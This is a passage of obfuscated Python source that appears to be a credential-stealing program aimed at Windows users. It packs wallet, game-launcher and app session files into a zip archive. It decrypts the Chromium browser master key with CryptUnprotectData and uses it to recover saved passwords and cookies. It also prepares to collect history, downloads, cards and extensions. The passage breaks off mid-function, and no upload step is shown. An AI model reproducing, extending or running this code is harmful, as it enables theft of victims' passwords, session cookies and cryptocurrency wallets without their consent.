        if v4r_type in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV and os.path.exists(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
            try:
                if v4r_type == "Wallets" and BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM is not None:
                    BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM.append(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB)
                elif v4r_type == "Game Launchers" and YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ is not None:
                    YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ.append(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB)
                elif v4r_type == "Apps" and QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH is not None:
                    QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH.append(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB)

                TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(os.path.join("Session Files", MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, "path.txt"), LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL)

                if os.path.isdir(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
                    for v4r_root, _, v4r_files in os.walk(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
                        for v4r_file in v4r_files:
                            RPWNURCAEZZBVJTAORGBPVCTZOSMIEBUWTGJLYAPAHIVITPVPMQTREVHQZVFYYJCJQNY = os.path.join(v4r_root, v4r_file)
                            ENPDFXBNISPUYZZMIAHFBWORDCSZZWMDLTHGVOTEXPUTOWYIPZOCYUTMSXGYJFVATAENRMOTWXAOVWWUOWNYKXWNYVKMZGZE = os.path.join(
                                "Session Files", MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, "Files",
                                os.path.relpath(RPWNURCAEZZBVJTAORGBPVCTZOSMIEBUWTGJLYAPAHIVITPVPMQTREVHQZVFYYJCJQNY, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL)
                            )
                            try:
                                TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.write(RPWNURCAEZZBVJTAORGBPVCTZOSMIEBUWTGJLYAPAHIVITPVPMQTREVHQZVFYYJCJQNY, ENPDFXBNISPUYZZMIAHFBWORDCSZZWMDLTHGVOTEXPUTOWYIPZOCYUTMSXGYJFVATAENRMOTWXAOVWWUOWNYKXWNYVKMZGZE)
                            except:
                                pass
                else:
                    ENPDFXBNISPUYZZMIAHFBWORDCSZZWMDLTHGVOTEXPUTOWYIPZOCYUTMSXGYJFVATAENRMOTWXAOVWWUOWNYKXWNYVKMZGZE = os.path.join("Session Files", MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, "Files", os.path.basename(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL))
                    try:
                        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.write(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, ENPDFXBNISPUYZZMIAHFBWORDCSZZWMDLTHGVOTEXPUTOWYIPZOCYUTMSXGYJFVATAENRMOTWXAOVWWUOWNYKXWNYVKMZGZE)
                    except:
                        pass
            except:
                pass

    if "Wallets" in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV:
        BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM = ", ".join(BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM) if BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM else "No"
    if "Game Launchers" in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV:
        YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ = ", ".join(YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ) if YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ else "No"
    if "Apps" in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV:
        QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH = ", ".join(QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH) if QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH else "No"

    return BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM, YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ, QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH

def RNATGZQLGLKBFCVWWNGENRVGNPDGFCSRZGSQVJTJDKIFZAJDTIFQWWFWTOAOAMMCHMUQYLPDDRRO(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE, LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA, KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ, MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM, KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT, UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD

    RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    FPKJUSKHHWZJDAYYSHWCWDJIWWXCLYBDAOVSWXTQWBNNLOKFSWFUPSJXNKVTSBLQUYJGPSCMDH = []

    if "extentions" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE = 0
    else:
        YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE = None

    if "passwords" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL = []
        LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA = 0
    else:
        QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL = ""
        LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA = None
    if "cookies" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED = []
        KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ = 0
    else:
        LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED = ""
        KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ = None
    if "history" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO = []
        MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM = 0
    else:
        SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO = ""
        MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM = None
    if "downloads" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX = []
        KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT = 0
    else:
        WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX = ""
        KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT = None
    if "cards" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX = []
        UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD = 0
    else:
        TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX = ""
        UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD = None
    
    def FHVXIUGRBFTKKHTHTUZBDASSOEJUAOMSNVSWOIRYSOWUWXRJUSPOIDPWAGYMZPQCIGOARRNFMYKGAFZCX(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
        if not os.path.exists(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
            return None

        try:
            with open(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, 'r', encoding='utf-8') as v4r_f:
                LRONNZMHJRUUYOSLXMBUYZEUVAIFLMSNOFKKEJUCYLYOPSESIZZJAFQLASUQQWONNXE = json.load(v4r_f)

            JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_key = base64.b64decode(LRONNZMHJRUUYOSLXMBUYZEUVAIFLMSNOFKKEJUCYLYOPSESIZZJAFQLASUQQWONNXE["os_crypt"]["encrypted_key"])[5:]
            SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG = win32crypt.CryptUnprotectData(JNMFNCQDOWYQVWMIUPINZLFKRSJRXYLYVICZSCRPNFTOOQCGVWHJ_key, None, None, None, 0)[1]
            return SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG
        except:
            return None

    def VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVA(PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG):
        try:
            PPTUVGGXQUXGSLVMJITKSXGUKFBKQNJUJQNCNHWZGFVYQPOOIYYNSPYBAS = PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME[3:15]
            BIYKSABYZPXXBZBMOLCKFBZHQJPLFAXHLRPLJDDITOFDPLLCQTUTSMHHNFORVXMECBKBGHCNAGSBZKXZUELODAVLXZMPKR = PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME[15:-16]
            ZFQOBWWGITNPOVSLUJTIBVSQIVSGHXSWKHUSETLHHLLVRPTKUSFIQYYPZUQMBNO = PBZRSUJWDTPJCMPWTZYOMPMJZBVUKPPXRESTXJHSXAADBMFJME[-16:]
            FPFUUNECYWIJAUNBEUEUAOFFDBXOVRKEKBOSBWBWEYQLAVPQKPUTEUEREZHUGMJFUYVWVYCNIDOAHPEOEJIO = Cipher(algorithms.AES(SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG), modes.GCM(PPTUVGGXQUXGSLVMJITKSXGUKFBKQNJUJQNCNHWZGFVYQPOOIYYNSPYBAS, ZFQOBWWGITNPOVSLUJTIBVSQIVSGHXSWKHUSETLHHLLVRPTKUSFIQYYPZUQMBNO))
            NRRXXTZMHAWOUVEVJKSDVJZLEWVWVJUJFVWHKWSKKUFJIOUOTTVXWAGAKYHHWTAIRNPQBZXBOQMPPNXG = FPFUUNECYWIJAUNBEUEUAOFFDBXOVRKEKBOSBWBWEYQLAVPQKPUTEUEREZHUGMJFUYVWVYCNIDOAHPEOEJIO.decryptor()
            KUYMCKBJBFHVPKMKONYYOPHGONXLNCOGSSPHCOINKILWEQYLLCQUPHVPFJDBIWAWOEPYZT = NRRXXTZMHAWOUVEVJKSDVJZLEWVWVJUJFVWHKWSKKUFJIOUOTTVXWAGAKYHHWTAIRNPQBZXBOQMPPNXG.update(BIYKSABYZPXXBZBMOLCKFBZHQJPLFAXHLRPLJDDITOFDPLLCQTUTSMHHNFORVXMECBKBGHCNAGSBZKXZUELODAVLXZMPKR) + NRRXXTZMHAWOUVEVJKSDVJZLEWVWVJUJFVWHKWSKKUFJIOUOTTVXWAGAKYHHWTAIRNPQBZXBOQMPPNXG.finalize()
            return KUYMCKBJBFHVPKMKONYYOPHGONXLNCOGSSPHCOINKILWEQYLLCQUPHVPFJDBIWAWOEPYZT.decode()
        except:
            return None
        
    def NRWPWSSNWJWEKBDNSMZCSOPCFQBAXIQAZETZPJHWETFSYKIEUGUSOODHHAZTHCX(ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG):
        global LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA
        MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL_db = os.path.join(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, 'Login Data')
        if not os.path.exists(MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL_db):
            return

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW = sqlite3.connect(":memory:")
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ = sqlite3.connect(MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL_db)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.backup(AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.close()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX = AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.cursor()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ =          f"- Url      : {v4r_row[0]}"
            RLLQWZEGYKWARXWHKHERRLSVLFOYWIHUTROWPTQFFOTYGNWSKLBLFLYWNUVCWTHGTDCLBAFRLBHZGUWQZQPOXQYVXSOIHJJDN =     f"  Username : {v4r_row[1]}"
            MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL =     f"  Password : {VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVA(v4r_row[2], SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG)}"
            ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name = f"  Browser  : {ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA}"
            QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL.append(f"{VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ}\n{RLLQWZEGYKWARXWHKHERRLSVLFOYWIHUTROWPTQFFOTYGNWSKLBLFLYWNUVCWTHGTDCLBAFRLBHZGUWQZQPOXQYVXSOIHJJDN}\n{MUKBGPZWFRCQOREIJXPNKEFUFGTZVKOXVVSVWZYNHDPKIJXZRFNCRQSVGITQTNRHTRNTGIANAULKRDCFROWTXNEDOATUQJVL}\n{ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name}\n")
            LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA += 1

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.close()

    def TLXGLIRMRCTLRKVAGUDIUUKFJFLSTQUSTVFDRHAMZHVGQZAPVEIXHTMXGCVLWTOSNVZJEFNVFHGDORCXUMJZOJUWZIMXM(ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG):
        global KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ
        YPVSTXWYOHDVQDHZCOZDRITZNHNZMULNRTCONKYSKQYAQRMXVSNNTPXSGWKXPNUUWXEPKCIDASEPSJIGCLDJYEQFMA = os.path.join(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, 'Network', 'Cookies')
        if not os.path.exists(YPVSTXWYOHDVQDHZCOZDRITZNHNZMULNRTCONKYSKQYAQRMXVSNNTPXSGWKXPNUUWXEPKCIDASEPSJIGCLDJYEQFMA):
            return

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW = sqlite3.connect(":memory:")
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ = sqlite3.connect(YPVSTXWYOHDVQDHZCOZDRITZNHNZMULNRTCONKYSKQYAQRMXVSNNTPXSGWKXPNUUWXEPKCIDASEPSJIGCLDJYEQFMA)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.backup(AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.close()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX = AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.cursor()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ =          f"- Url     : {v4r_row[0]}"
            MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB =         f"  Name    : {v4r_row[1]}"
            LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL =         f"  Path    : {v4r_row[2]}"
            CZTJTCEDTEUIRFILHSZRKJECJOAMAWEESVYGZLKHVYSHWJSFQIAMJALZLOGVUJLODNQYDVRZ =       f"  Cookie  : {VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVA(v4r_row[3], SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG)}"
            VPQJAVNECDCWLPZJSOADWIGJHZPQHZZDASRSDQDTBFCEQWMGQENVWKTPKDYOWWQUQFOTAOSNZBQIXLHBETSBCNWQ =       f"  Expire  : {v4r_row[4]}"
            ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name = f"  Browser : {ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA}"
            LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED.append(f"{VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ}\n{MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB}\n{LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL}\n{CZTJTCEDTEUIRFILHSZRKJECJOAMAWEESVYGZLKHVYSHWJSFQIAMJALZLOGVUJLODNQYDVRZ}\n{VPQJAVNECDCWLPZJSOADWIGJHZPQHZZDASRSDQDTBFCEQWMGQENVWKTPKDYOWWQUQFOTAOSNZBQIXLHBETSBCNWQ}\n{ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name}\n")
            KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ += 1

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.close()

    def TUMEXLPGYGXDUXPWCACRDYWEFNXIOZKWVDDLRGCUEGGVCCKIDHGAOBIZSZDEYOCOWUCLGHFQUV(ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS):
